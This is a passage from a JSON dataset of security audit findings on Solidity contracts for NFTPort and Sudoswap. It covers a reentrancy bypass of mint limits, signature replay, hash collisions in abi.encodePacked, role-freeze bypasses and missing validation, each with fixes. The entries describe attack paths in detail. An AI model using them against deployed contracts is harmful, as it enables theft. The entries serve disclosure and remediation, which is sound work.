Recommendation\n``` solidity\n    function _setTemplate(\n        string memory templateName,\n        uint256 templateVersion,\n        address implementationAddress\n    ) internal {\n\n -      if (templateVersion > latestVersion[templateName]) {\n +      if (templateVersion > = latestVersion[templateName]) {\n            latestVersion[templateName] = templateVersion;\n            latestImplementation[templateName] = implementationAddress; \n        }\n\n\n```\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/4\n\n**rayn731**\n\nFixed, it prevents using version 0, only > 0 is allowed.",
      "summary": "\nThis bug report is about an issue found in the Factory.sol smart contract. The issue is that when a template is registered with a version of 0, the latestImplementation[templateName] will be set to address(0) and _templateNames will be duplicated. This can cause external contracts to think there is no setup, resulting in duplicate setups that keep failing. The code snippet provided is from line 415 of the Factory.sol smart contract. The bug was found by bin2chen through manual review. The recommendation provided is to change the code so that templateVersion > = latestVersion[templateName] instead of just >. This was discussed and then fixed in a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/80",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "3551",
      "title": "M-6: Freezing roles in ERC721NFTProduct and ERC1155NFTProduct is moot",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/81 \n\n## Found by \n0x52\n\n## Summary\n\nIn ERC721NFTProduct and ERC1155NFTProduct roles can be frozen which is supposed to lock role to current addresses and not allow any changes. The problem is that admin can still use AccessControlUpgradable#grantRole and revokeRole to grant and remove roles to addresses because hasRole allows \"ADMIN_ROLE\" to bypass all role restrictions even \"DEFAULT_ADMIN_ROLE\".\n\n## Vulnerability Detail\n\n    function hasRole(bytes32 role, address account)\n        public\n        view\n        virtual\n        override\n        returns (bool)\n    {\n        return\n            super.hasRole(ADMIN_ROLE, account) || super.hasRole(role, account);\n    }\n\nIn GranularRoles.sol and AccessControlUpgradable.sol, developers are careful to never grant the \"DEFAULT_ADMIN_ROLE\" to any user. Additionally they never set the admin role of any role so that it's admin will remain \"DEFAULT_ADMIN_ROLE\". In theory this should make so that there is no way to grant or revoke roles outside of GranularRoles#_initRoles and updateRoles. The issue is that the override by GranularRoles#hasRole allows \"ADMIN_ROLE\" to bypass any role restriction including \"DEFAULT_ADMIN_ROLE\". This allows \"ADMIN_ROLE\" to directly call AccessControlUpgradable#grantRole and revokeRole, which makes the entire freezing system useless as it doesn't actually stop any role modification.\n\n## Impact\n\nFreezing roles doesn't actually prevent \"ADMIN_ROLE\" from modifying roles as intended. Submitting as high due to gross over-extension of admin authority clearly violating intended guardrails.\n\n## Code Snippet\n\n[GranularRoles.sol#L87-L96](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/lib/GranularRoles.sol#L87-L96)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOverride AccessControlUpgradable#grantRole and revokeRole in GranularRoles.sol to revert when called:\n\n     GranularRoles.sol\n\n    +   function grantRole(bytes32 role, address account) public virtual override {\n    +       revert();\n    +   }\n\n    +   function revokeRole(bytes32 role, address account) public virtual override {\n    +       revert();\n    +   }\n\n## Discussion\n\n**Evert0x**\n\nAdmin role having more power than intended is not a med/high issue for the protocol team.\n\n**hyperspacebunny**\n\n@Evert0x This actually is valid and pretty high priority for us since it's a workaround for some pretty explicit rules in our permissions system. Can you reopen it?\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/15\n\n**rayn731**\n\nThe fix will disable `DEFAULT_ADMIN_ROLE` to grant/revoke roles, but `_owner` still has the ability to grant/revoke roles even if all roles are frozen?\n\n**hyperspacebunny**\n\nYup, our current intent is that the owner should always have control over the roles if they want to self-manage, freezing is just to remove the delegation to `ADMIN_ROLE`",
      "summary": "\nThis bug report is about an issue in the ERC721NFTProduct and ERC1155NFTProduct smart contracts, which are used to manage Non-Fungible Tokens (NFTs). The issue is that roles can be frozen, which is supposed to lock the role to the current address and prevent any changes. However, the admin can still use AccessControlUpgradable#grantRole and revokeRole to grant and remove roles to addresses because hasRole allows \"ADMIN_ROLE\" to bypass all role restrictions even \"DEFAULT_ADMIN_ROLE\". This means that the freezing system is useless as it doesn't actually stop any role modification. \n\nThe vulnerability was found by 0x52, who used manual review to identify the issue. The code snippet linked to GranularRoles.sol#L87-L96, which contains the override by GranularRoles#hasRole allowing \"ADMIN_ROLE\" to bypass any role restriction. The impact of this issue is that the freezing system doesn't prevent \"ADMIN_ROLE\" from modifying roles as intended, and the severity of the issue was rated as high due to the gross over-extension of admin authority. \n\nA fix was proposed to override AccessControlUpgradable#grantRole and revokeRole in GranularRoles.sol to revert when called. This was then implemented in the pull request https://github.com/nftport/evm-minting-sherlock-fixes/pull/15, which disables \"DEFAULT_ADMIN_ROLE\" to grant/revoke roles. However, the owner still has the ability to grant/revoke roles even if all roles are frozen, as this is the current intent of the system.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/81",
      "tags": [
        "Access Control"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3550",
      "title": "M-5: Template implementations doesn't validate configurations properly",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/83 \n\n## Found by \nElKu, rvierdiiev, obront, pashov, ctf\\_sec, joestakey, ak1, JohnnyTime, GimelSec, Dravee, JohnSmith, cccz\n\n## Summary\n\nIn past audits, we have seen contract admins claim that invalidated configuration setters are fine since “admins are trustworthy”. However, cases such as [Nomad got drained for over $150M](https://twitter.com/samczsun/status/1554260106107179010) and [Misconfiguration in the Acala stablecoin project allows attacker to steal 1.2 billion aUSD](https://web3isgoinggreat.com/single/misconfiguration-in-the-acala-stablecoin-project-allows-attacker-to-steal-1-2-billion-ausd) have shown again and again that even trustable entities can make mistakes. Thus any fields that might potentially result in insolvency of protocol should be thoroughly checked.\n\nNftPort template implementations often ignore checks for config fields. For the rest of the issue, we take `royalty` related fields as an example to illustrate potential consequences of misconfigurations. Notably, lack of check is not limited to `royalty`, but exists among most config fields.\n\nAdmins are allowed to set a wrong `royaltiesBps` which is higher than `ROYALTIES_BASIS`. `royaltyInfo()` will accept this invalid `royaltiesBps` and users will pay a large amount of royalty.\n\n## Vulnerability Detail\n\nEIP-2981 (NFT Royalty Standard) defines `royaltyInfo()` function that specifies how much to pay for a given sale price. In general, royalty should not be higher than 100%. [NFTCollection.sol](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L348) checks that admins can't set royalties to more than 100%:\n```solidity\n    /// Validate a runtime configuration change\n    function _validateRuntimeConfig(RuntimeConfig calldata config)\n        internal\n        view\n    {\n        // Can't set royalties to more than 100%\n        require(config.royaltiesBps <= ROYALTIES_BASIS, \"Royalties too high\");\n\n        ...\n```\n\nBut `NFTCollection` only check `royaltiesBps` when admins call `updateConfig()`, it doesn't check `royaltiesBps` in `initialize()` function, leading to admins could set an invalid `royaltiesBps` (higher than 100%) when initializing contracts.\n\nThe same problem exists in ERC721NFTProduct and ERC1155NFTProduct. Both ERC721NFTProduct and ERC1155NFTProduct don't check `royaltiesBasisPoints` in `initialize()` function. Furthermore, these contracts also don't check `royaltiesBasisPoints` when admins call `update()` function. It means that admins could set an invalid `royaltiesBasisPoints` which may be higher than 100% in any time.\n\n## Impact\n\nEIP-2981 only defines `royaltyInfo()` that it should return royalty amount rather than royalty percentage. It means that if the contract has an invalid royalty percentage which is higher than 100%, `royaltyInfo()` doesn't revert and users will pay a large amount of royalty.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L348\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L153\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC721NFTProduct.sol#L91\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC721NFTProduct.sol#L201\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L96\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L238\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCheck `royaltiesBps <= ROYALTIES_BASIS` both in `initialize()` and `update()` functions.\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/11\n\n**rayn731**\n\nLGTM, It checks `royaltiesBps` both in `initialize()` and `update()` functions.\nAnd uses `_validatePropertyChange()` to check values both in `initialize()` and `updateConfig()` functions.",
      "summary": "\nThis bug report is about a vulnerability in the NftPort template implementations which allows admins to set an invalid configuration, such as a royalty percentage higher than 100%, when initializing or updating contracts. This could lead to users paying a large amount of royalty, which could potentially result in insolvency of the protocol. \n\nThe bug was found by ElKu, rvierdiiev, obront, pashov, ctf\\_sec, joestakey, ak1, JohnnyTime, GimelSec, Dravee, JohnSmith, and cccz. It was identified through manual review.\n\nThe bug was fixed by hyperspacebunny in a pull request which checks `royaltiesBps` both in `initialize()` and `update()` functions, and uses `_validatePropertyChange()` to check values both in `initialize()` and `updateConfig()` functions. This was confirmed by rayn731. \n\nThe issue serves as a reminder that even trustable entities can make mistakes, and any fields that might potentially result in insolvency of protocol should be thoroughly checked.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/83",
      "tags": [
        "Royalty",
        "ERC2981"
      ],
      "finders": [
        "pashov",
        "cccz",
        "JohnnyTime",
        "joestakey",
        "Dravee",
        "ElKu",
        "JohnSmith",
        "ak1",
        "rvierdiiev",
        "obront",
        "GimelSec",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3549",
      "title": "M-4: Attackers can bypass `tokensPerMint` and mint lots of tokens in a transaction",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/85 \n\n## Found by \n0xSmartContract, GimelSec\n\n## Summary\n\nAttackers can bypass `tokensPerMint`, allowing them to mint over `tokensPerMint` per transaction.\n\n## Vulnerability Detail\n\nNFTCollection has `tokensPerMint` that enforces the maximum number of tokens the user can mint per transaction. But attackers can bypass `tokensPerMint` by reentrancy attack to call `mint()` or `presaleMint()` multiple times in a transaction.\n\nFor example, we assume that `tokensPerMint` is `5` and we have a large amount of `availableSupply()`:\n1. Alice (attacker) first creates an `AttackerContract` to call `mint(5)`, then [L318](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L318) will check that `amount <= _deploymentConfig.tokensPerMint` and call `_safeMint()` on L321.\n2. But `_safeMint()` has a [callback](https://github.com/chiru-labs/ERC721A/blob/v3.2.0/contracts/ERC721A.sol#L392) that it will call `onERC721Received()` if `to` address is a contract.\n3. Now `_safeMint()` calls `onERC721Received()` on the `AttackerContract`, and the `AttackerContract` re-enter `mint(5)` again. `mint()` function will pass the check of `tokensPerMint` on L318 again. Finally, Alice will mint 5+5 tokens in a transaction.\n\n## Impact\n\nAttackers can re-enter `mint()` function again and again to bypass the check of `tokensPerMint`, and mint lots of tokens in a transaction.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L317-L322\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIf the protocol wants to check `to` address, keep `_safeMint()` and add [ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) on `mint()` and `presaleMint()` to prevent reentrancy attack.\n\nOr just replace `_safeMint()` with `_mint()`.\n\n## Discussion\n\n**hyperspacebunny**\n\nI believe this only applies to free mints since `msg.value` will be 0 when called from the attacker's contract and `mint()` will revert due to the `paymentProvided` modifier.\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/14\n\n**rayn731**\n\nFixed, the fix uses reentrancy guard to prevent the bypass.",
      "summary": "\nThis bug report is about an issue found by 0xSmartContract and GimelSec, which allows attackers to bypass the `tokensPerMint` safety measure in NFTCollection. This safety measure is designed to enforce the maximum number of tokens the user can mint per transaction. \n\nThe vulnerability occurs when an attacker creates a contract that calls `mint()` or `presaleMint()` multiple times in a transaction. This allows the attacker to mint more tokens than the `tokensPerMint` limit.\n\nThe impact of this vulnerability is that attackers can bypass the `tokensPerMint` check and mint more tokens than the limit in a single transaction.\n\nThe code snippet that is vulnerable to this attack is located at https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L317-L322. Manual review was used to detect this issue.\n\nThe recommendation to fix this vulnerability is to either add ReentrancyGuard.sol to the `mint()` and `presaleMint()` functions, or to replace `_safeMint()` with `_mint()`. The issue was fixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/14 using ReentrancyGuard.sol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/85",
      "tags": [],
      "finders": [
        "GimelSec",
        "0xSmartContract"
      ]
    },
    {
      "id": "3548",
      "title": "M-3: The supply of NFT for each tokenID in ERC1155NFTProduct cannot be modified after the first minting",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/95 \n\n## Found by \nGimelSec, cccz\n\n## Summary\nThe supply of NFT for each tokenID in ERC1155NFTProduct cannot be modified after the first minting\n## Vulnerability Detail\nWhen minting NFT in the ERC1155NFTProduct contract, it will check whether the tokenID already exists, that is, as long as tokenSupply[tokenId] > 0, the ERC1155 NFT of this tokenId will not be able to be minted again.\nThis will lead to\n1. The supply of NFT for each tokenID is determined after the first mint\n2. Unable to mint ERC1155 NFT with the same tokenId for different users\n\nThis will greatly limit the application scenarios of ERC1155NFTProduct\n## Impact\n\n1. The supply of NFT for each tokenID is determined after the first mint\n2. Unable to mint ERC1155 NFT with the same tokenId for different users\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L279-L286\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L259-L265\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L388-L390\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider removing the _exists check when minting ERC1155 NFT in the ERC1155NFTProduct contract\n\n## Discussion\n\n**hyperspacebunny**\n\nWe've decided to not change the behaviour at this point and revisit it once we have requests from users. It's currently working as designed.",
      "summary": "\nThis bug report discusses an issue found in the ERC1155NFTProduct contract, which is part of the Sherlock Audit 2022-10-nftport project. The issue is that the supply of NFT for each tokenID in the contract cannot be modified after the first minting. This will greatly limit the application scenarios of ERC1155NFTProduct. The vulnerability was found by GimelSec and cccz through manual review, and the source code snippets were provided. The recommendation is to consider removing the exists check when minting ERC1155 NFT in the ERC1155NFTProduct contract. However, this suggestion was not implemented as it is working as designed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/95",
      "tags": [],
      "finders": [
        "cccz",
        "GimelSec"
      ]
    },
    {
      "id": "3547",
      "title": "M-2: Factory.sol : Issue with arbitrary data as signature in signature based call and deploy methods.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/106 \n\n## Found by \nobront, 8olidity, bin2chen, ak1, minhquanym, ctf\\_sec, JohnSmith, Lambda\n\n## Summary\nIn Factory contract, deploy and call methods are using the signature based approach for deployment. This is not safe when we look at the way the signature is comes from user.\n\n## Vulnerability Detail\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L147-L225\n\nIn above line of codes, user is allowed for deployment by using the signature data. This could have multiple impacts as explained in Impact section.\n\n## Impact\n1. Signature replay attack.\n2. Signature reuse across different NFT Port projects if it is to be launched in multiple chains.\nBecause the chain ID is not included in the data, all signatures are also valid when the project is launched on a chain with another chain ID. For instance, let’s say it is also launched on Polygon. An attacker can now use all of the Ethereum signatures there. Because the Polygon addresses of user’s (and potentially contracts, when the nonces for creating are the same) are often identical, there can be situations where the payload is meaningful on both chains.\n3. Signature without domain , nonces are not safe along with the standard specified in EIP 712. \n4. Signature reuse from different Ethereum projects & phishing\nBecause the  signature is very generic, there might be situations where a user has already signed data with the same format for a completely different Ethereum application. Furthermore, an attacker could set up a DApp that uses the same format and trick someone into signing the data. Even a very security-conscious owner that has audited the contract of this DApp (that does not have any vulnerabilities and is not malicious, it simply consumes signatures that happen to have the same format) might be willing to sign data for this DApp, as he does not anticipate that this puts his NFT Port project in danger.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L147-L225\n\n## Tool used\n\nManual Review\n\n## Recommendation\nI strongly recommend to follow [EIP-712](https://eips.ethereum.org/EIPS/eip-712) and not implement your own standard / solution. While this also improves the user experience, this topic is very complex and not easy to get right, so it is recommended to use a battle-tested approach that people have thought in detail about. All of the mentioned attacks are not possible with EIP-712:\n1.) There is always a domain separator that includes the contract address.\n2.) The chain ID is included in the domain separator\n5.) There is a type hash (of the function name / parameters)\n6.) The domain separator does not allow reuse across different projects, phishing with an innocent DApp is no longer possible (it would be shown to the user that he is signing data for Rigor, which he would off course not do on a different site)\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/18\n\n**rayn731**\n\nFixed, follows EIP-712 standard for hashing and signing data.",
      "summary": "\nThis bug report is about a vulnerability found in the Factory contract of the NFT Port project. It is related to the deploy and call methods which use a signature based approach for deployment. This could have multiple impacts such as signature replay attack, signature reuse across different NFT Port projects, signature without domain and nonces, and signature reuse from different Ethereum projects & phishing. It was found by obront, 8olidity, bin2chen, ak1, minhquanym, ctf\\_sec, JohnSmith, and Lambda. The code snippet and manual review were used to identify the issue. The recommended solution was to follow the EIP-712 standard for hashing and signing data. It was fixed in a pull request which follows the EIP-712 standard.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/106",
      "tags": [],
      "finders": [
        "8olidity",
        "minhquanym",
        "bin2chen",
        "Lambda",
        "JohnSmith",
        "ak1",
        "obront",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3546",
      "title": "M-1: `abi.encodePacked` Allows Hash Collision",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/118 \n\n## Found by \nkeccak123, 0xheynacho\n\n## Summary\n\nFrom the solidity documentation:\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\n    > If you use `keccak256(abi.encodePacked(a, b))` and both `a` and `b` are dynamic types, it is easy to craft collisions in the hash value by moving parts of `a` into `b` and vice-versa. More specifically, `abi.encodePacked(\"a\", \"bc\") == abi.encodePacked(\"ab\", \"c\")`.\n\nThis issue exists in the Factory contract can results in hash collisions, bypassing the `signedOnly` modifier.\n\n## Vulnerability Detail\n\nThe issue is in these lines of code:\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L171\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L195\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L222\n\nAs the solidity docs describe, two or more dynamic types are passed to `abi.encodePacked`. Moreover, these dynamic values are user-specified function arguments in external functions, meaning anyone can directly specify the value of these arguments when calling the function. The `signedOnly` modifier is supposed to protect functions to permit only function arguments that have been properly signed to be passed to the function logic, but because a collision can be created, the modifier can be bypassed for certain select inputs that result in the same `encodePacked` value.\n\n## Impact\n\nThe `signedOnly` modifier ([line 537](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L537)) is not effective because the modifier can be bypassed by different function arguments that result in the same signature when the values are `encodePacked` together. This can result in the submission of values that were not actually signed.\n\n## Code Snippet\n\nAll instances of `abi.encodePacked` in the contract pass multiple dynamic type arguments\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L171\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L195\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L222\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInstead of writing functions to accept several arguments that are hashed inside the function, consider rewriting the function to take the hashed value as a function argument directly so that the hashing process happens off-chain. This approach would solve the issue and save gas.\n\n## Discussion\n\n**Evert0x**\n\nDowngrading to medium severity, fails to show an exploit pattern.\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/18\n\n**rayn731**\n\nFixed, and it follows EIP-712 standard for hashing and signing data.",
      "summary": "\nThis bug report is about an issue found in the Factory contract, which allows hash collisions and bypasses the `signedOnly` modifier. This issue is due to the fact that two or more dynamic types are passed to `abi.encodePacked` which can be user-specified function arguments. This can result in the submission of values that were not actually signed.\n\nThe issue was found by keccak123 and 0xheynacho and was fixed in a pull request by hyperspacebunny. The fix follows EIP-712 standard for hashing and signing data.\n\nIn order to solve this issue, the functions should be rewritten to take the hashed value as a function argument directly, so that the hashing process happens off-chain. This would save gas and solve the issue.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/118",
      "tags": [
        "Hash Collision",
        "ABI Encoding"
      ],
      "finders": [
        "keccak123",
        "0xheynacho"
      ]
    },
    {
      "id": "6790",
      "title": "Add Reentrancy Guards",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context: All LSSVM Contracts\n\nSpecifically, three categories of functions:\n\n1. Functions withdrawing ETH\n2. Functions sending ETH\n3. Functions that use `safeTransferFrom()` to call external addresses.\n\n### Instances of Functions Withdrawing ETH:\n- `LSSVMPairFactory.sol#L272`\n- `LSSVMPairETH.sol#L104`\n\n### Instances of Functions Sending ETH:\n- `LSSVMPairETH.sol#L34`\n- `LSSVMPairETH.sol#L46`\n- `LSSVMPairETH.sol#L79`\n- `LSSVMRouter.sol#L376`\n- `LSSVMRouter.sol#L423`\n- `LSSVMRouter.sol#L640`\n- `LSSVMRouter.sol#L677`\n\n### Uses of `safeTransferFrom()` to External Addresses:\n- `LSSVMRouter.sol#L544`\n- `LSSVMRouter.sol#L593`\n- `LSSVMPairFactory.sol#L773`\n- `LSSVMPairEnumerable.sol#L33`\n- `LSSVMPairEnumerable.sol#L52`\n- `LSSVMPairEnumerable.sol#L73`\n- `LSSVMPairEnumerable.sol#L114`\n- `LSSVMPairMissingEnumerable.sol#L37`\n- `LSSVMPairMissingEnumerable.sol#L58`\n- `LSSVMPairMissingEnumerable.sol#L82`\n- `LSSVMPairMissingEnumerable.sol#L133`\n- `LSSVMPairMissingEnumerable.sol#L143`\n\n## Description\nThe abovementioned permalinks and corresponding functions are listed for Sudoswap’s consideration to introduce reentrancy guard modifiers. Currently, there is only one function that uses a reentrancy guard modifier: `withdrawAllETH()` in `LSSVMPairETH.sol#L94`.\n\nOther functions in the codebase may also require reentrancy guard modifiers. We have only seen reentrancy problems when malicious routers, asset recipients, curves, factory owner, or protocol fee recipient are involved. Despite normal prohibitions on this occurrence, it is better to protect one’s codebase than regret leaving open vulnerabilities available for potential attackers. \n\nThere are three categories of functions that Sudoswap should consider applying reentrancy guard modifiers to: functions withdrawing ETH, functions sending ETH, and uses of `safeTransferFrom()` to external addresses (which will trigger an `onERC1155Received()` callback to receiving contracts).\n\n### Examples of Functions Withdrawing ETH within LSSVM:\n- `LSSVMPairFactory.sol#L272`\n- `LSSVMPairETH.sol#L104`\n\n### Instances of Functions Sending ETH within LSSVM:\n- `LSSVMPairETH.sol#L34`\n- `LSSVMPairETH.sol#L46`\n\n### Instances That Use `safeTransferFrom()` to Call External Addresses:\nA couple of instances that use `safeTransferFrom()` to call external addresses, which will trigger an `onERC1155Received()` callback to receiving contracts:\n- `LSSVMPairFactory.sol#L428`\n- `LSSVMRouter.sol#L544`\n\n## Recommendation\nSpearbit recommends Sudoswap to consider adding reentrancy guards to the abovementioned functions and to the entire codebase where appropriate.\n\n## Sudoswap's Response\nWe’ve addressed the specific issues linked above with regards to reentrancy. The checks in `_pairTransferERC20From` and `_takeNFTsFromSender` both verify token balance or ownership before and after each transfer, which can help ensure that tokens are actually sent to the Pair (or its asset recipient). \n\nHowever, we acknowledge this does not mitigate the entire space of possible issues with future malicious routers. The gas overhead for adding Reentrancy-Guard can be quite significant when, for example, swapping across multiple pools in one transaction, so we have opted to avoid it if possible. Pair owners will need to be aware of which new routers become approved by the factory owner (intended to be set to governance-controlled timelock during deployment).\n\n## Spearbit's Acknowledgment\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6789",
      "title": "Avoid utilizing inside knowledge of functions",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- LSSVMRouter.sol\n- LSSVMPair.sol\n- LSSVMPairETH.sol\n\n## Description\nETH-based swap functions use `isRouter == false` and `routerCaller == address(0)` as parameters to `swapTokenForAnyNFTs()` and `swapTokenForSpecificNFTs()`. These parameters end up in `_validateTokenInput()`. The LSSVMPairETH version of this function does not use those parameters, so it is not a problem at this point. \n\nHowever, the call actually originates from the Router, so functionally `isRouter` should be true. \n\nOur concern is that using inside knowledge of the functions might potentially introduce subtle issues in the following scenarios:\n\n```solidity\nfunction robustSwapETHForAnyNFTs(...) {\n    ...\n    remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0));\n    ...\n}\n```\n\n```solidity\nfunction robustSwapETHForSpecificNFTs(...) {\n    ...\n    remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0));\n    ...\n}\n```\n\n```solidity\nfunction _swapETHForAnyNFTs(...) {\n    ...\n    remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0));\n    ...\n}\n```\n\n```solidity\nfunction _swapETHForSpecificNFTs(...) {\n    ...\n    remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0));\n    ...\n}\n```\n\n```solidity\nfunction swapTokenForAnyNFTs(..., bool isRouter, address routerCaller) {\n    ...\n    _validateTokenInput(inputAmount, isRouter, routerCaller, _factory);\n    ...\n}\n```\n\n```solidity\nfunction swapTokenForSpecificNFTs(..., bool isRouter, address routerCaller) {\n    ...\n    _validateTokenInput(inputAmount, isRouter, routerCaller, _factory);\n    ...\n}\n```\n\nAbstract contract LSSVMPairETH extends LSSVMPair:\n\n```solidity\nabstract contract LSSVMPairETH is LSSVMPair {\n    function _validateTokenInput(..., bool, /*isRouter*/ address, /*routerCaller*/ ...) {\n        // doesn't use isRouter and routerCaller\n    }\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to consider making the changes listed below in the following functions:\n- `_swapETHForSpecificNFTs`\n- `robustSwapETHForAnyNFTs`\n- `robustSwapETHForSpecificNFTs`\n- `_swapETHForAnyNFTs`\n\nChanges to be made:\n\n```solidity\n- remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0));\n+ remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, true, msg.sender);\n```\n\n```solidity\n- remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0));\n+ remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, true, msg.sender);\n```\n\n## Acknowledgments\n- **Sudoswap**: Addressed in this branch here.\n- **Spearbit**: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
